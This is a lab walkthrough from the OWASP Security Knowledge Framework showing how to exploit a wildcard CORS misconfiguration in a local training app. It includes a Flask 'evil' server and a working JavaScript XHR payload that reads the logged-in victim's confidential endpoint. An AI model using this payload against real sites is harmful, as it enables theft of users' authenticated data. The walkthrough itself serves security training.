# CORS exploitation

## Running the app on Docker

```text
$ sudo docker pull blabla1337/owasp-skf-lab:java-cors
```

```text
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:java-cors
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

## Reconnaissance

Access-Control-Allow-Origin is a response header used by a server to indicate which domains are allowed to read the response. Based on the CORS W3 Specification it is up to the client to determine and enforce the restriction of whether the client has access to the response data based on this header.

From a penetration testing perspective you should look for insecure configurations as for example using a '\*' wildcard as value of the Access-Control-Allow-Origin header that means all domains are allowed.

Nowadays most modern frameworks do dynamical allocation of the origin header. This means that the value that is send from the origin header is dynamically allocated to the Access-Control-Allow-Origin response from the server. To verify the behaviour we need to set up our intercepting proxy, make requests to an API server and tamper with the "origin" header.

Now that we have our proxies set-up let's first start and authenticate against the target application as admin/admin.

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/CORS/1.png)

{% hint style="info" %}
username : admin  
password: admin
{% endhint %}

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/CORS/2.png)

Now that we have logged in as the target user let's look at some intercepted traffic from the application.

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/CORS/3.png)

The image above shows highlighted in red that indeed the application has CORS enabled and has set a wildcard for the "Access-Control-Allow-Origin" response header.

Since "Access-Control-Allow-Origin" is set to wildcard, we can use any origin to consume thie page/endpoint.

The rest of the attack will look kind of similar to a CSRF attack. However, instead of doing a state changing operation on behalf of the targeted user, we will now do a XHR GET request from our evil domain in order to steal sensitive information.

{% hint style="info" %}
More information about CSRF:  
[https://www.owasp.org/index.php/Testing_for_CSRF\_\(OTG-SESS-005\)](https://www.owasp.org/index.php/Testing_for_CSRF_%28OTG-SESS-005%29)
{% endhint %}

## Exploitation

In order to to exploit this vulnerability we need to set up our evil webserver to do the malicious XHR GET request from. We could achieve this by creating the following python flask application.

### Step1
Lets copy our fancy frontend files for our evil webserver.

```text
$mkdir /tmp/evil/
$cp -r /config/java-labs/cors/src/main/resources/static/ /tmp/evil/
$mkdir templates
```

We copied static files to our evil webserver directory (/tmp/evil)
Now, lets create flask app using code snippet below:

```python
from flask import Flask, request, render_template
import requests


app = Flask(__name__, static_url_path='/static', static_folder='static')

app.config['DEBUG'] = True

@app.route("/")
def start():
    return render_template("evil.html")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337)
```

Save the snippet above to &gt; /tmp/evil/evil.py and run the commands below to install some dependencies.

```text
$ pip3 install flask
$ pip3 install requests
```

Of course you can also run your app on whatever service you want it does not have to be python flask.

### Step2

Now that the service is running we want to serve the malicious piece of javascript that is responsible for performing the malicious XHR GET request.

```javascript
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','http://0.0.0.0:7000/confidential', true);
  req.withCredentials = false;
  req.send();

  function reqListener(){
    var foo = document.getElementById("stolenInfo").innerHTML= req.responseText;
    Console.log(foo)
  }
</script>

<p id="stolenInfo"></p>
```

Save the snippet above to &gt; /tmp/templates/evil.html. The final evil.html file to be used by flask application should look like below:

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>SKF Labs</title>
  <link href="/static/css/Normalize.css" rel="stylesheet">
  <link href="/static/css/datepicker3.css" rel="stylesheet">
  <link href="/static/css/styles.css" rel="stylesheet">
  <!--Icons-->
  <script src="/static/js/lumino.glyphs.js"></script>
  <script src="/static/js/hints.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Hind:wght@700&display=swap" rel="stylesheet">
</head>
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','http://0.0.0.0:7000/confidential', true);
  req.withCredentials = false;
  req.send();
  
  function reqListener(){
    var foo = document.getElementById("stolenInfo").innerHTML= req.responseText;
    Console.log(foo)
  }
  </script>
 
  <p id="stolenInfo"></p>
<body>
  <header class="header">
    <div class="wrap wide">
      <div class="inner flx flx-ac flx-jsb">
        <div class="left flx flx-ac">
          <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75.3 86.9"
              style="enable-background:new 0 0 75.3 86.9" xml:space="preserve">
              <path d="" />
            </svg>
          </div>
          <div class="name pl1">
            Security Knowledge Framework
          </div>
        </div>
        <div class="right flx flx-ac">
          <div class="chat">
            <a href="https://gitter.im/Security-Knowledge-Framework/Lobby" rel="nofollow">
              <img src="/static/img/badge.svg" alt="Join the chat at
                    https://gitter.im/Security-Knowledge-Framework/Lobby" data-canonical-src="/static/img/badge.svg">
            </a>
          </div>
          <div class="toggle">
            <input type="checkbox" class="checkbox" id="checkbox">
            <label for="checkbox" class="label">
              <i class="fas fa-moon"></i>
              <i class='fas fa-sun'></i>
              <div class="ball"></div>
            </label>
          </div>
        </div>
      </div>
    </div>
  </header>
  <main class="container">
    <section class="bgg">
      <div class="wrap small">
        <div class="inner pt6 pb6">
          <!-- Start Original Code -->
          <div class="col-sm-9 col-sm-offset-3 col-lg-10 col-lg-offset-2 main">
            <div class="row">
            </div>
          <!--/.row-->
            <div class="row">
              <div class="col-lg-12">
                <h1 class="page-header">Evil website!</h1>
              </div>
            </div>
            <!--/.row-->
            <div class="row">
              <div class="col-lg-12">
                <div class="panel panel-default">
                  <div class="panel-heading">CORS Hijacking!</div>
                  <div class="panel-body">
                    <div class="col-md-6">
                      <p>Welcome to my evil webpage, you have been hacked, let me show you the secret information!</p>
                    </div>
                    </form>

                  </div>
                </div>
              </div><!-- /.col-->
            </div><!-- /.row -->
            <p style="font-size:20px;">
            </p>
          </div>
          <!--/.main-->
          <p id="cors"></p>
          <!-- End Original Code -->
        </div>
      </div>
    </section>
    <footer class="footer">
      <div class="wrap wide">
        <div class="inner pt3 pb3 text-center">
          &copy; SKF - <a rel="nofollow" href="https://www.securityknowledgeframework.org/"
            target="_blank">Visit
            website</a>
        </div>
      </div>
    </footer>
    <div class="seed">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75.3 86.9" style="enable-background:new 0 0 75.3 86.9"
        xml:space="preserve">
        <path d="\z" />
      </svg>
    </div>
  </main>
  <script src="/static/js/jquery.min.js"></script>
  <script src="/static/js/bootstrap.min.js"></script>
  <script>
    const checkbox = document.getElementById('checkbox');
    checkbox.addEventListener('change', () => {
      document.body.classList.toggle('dark');
    });
  </script>
</body>
</html>
```

The final folder structure for our evil webserver should look like this:
![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/CORS/4.png)


### Step3
Run the command below to start our evil application.

```text
$ python3 evil.py
```

Let's intercept the request from the evil application to the target application.

In this request we find the "Origin" header appended to the request from source "[http://localhost:1337](http://localhost:1337)" as to be expected. 

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/CORS/5.png)

This is due to the fact that the application framework has no value to do the dynamically allocation of the origin header from. Now the "Access-Control-Allow-Origin" response header falls back to it's default which is the "\*" \(wildcard\).

Let's open our evil app

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/CORS/6.png)

We now find that we have successfully have performed a XHR GET request on the authenticated victim users behalf and stolen the sensitive information from the target application!

## Additional sources

Please read here for more information about this attack:  
[https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)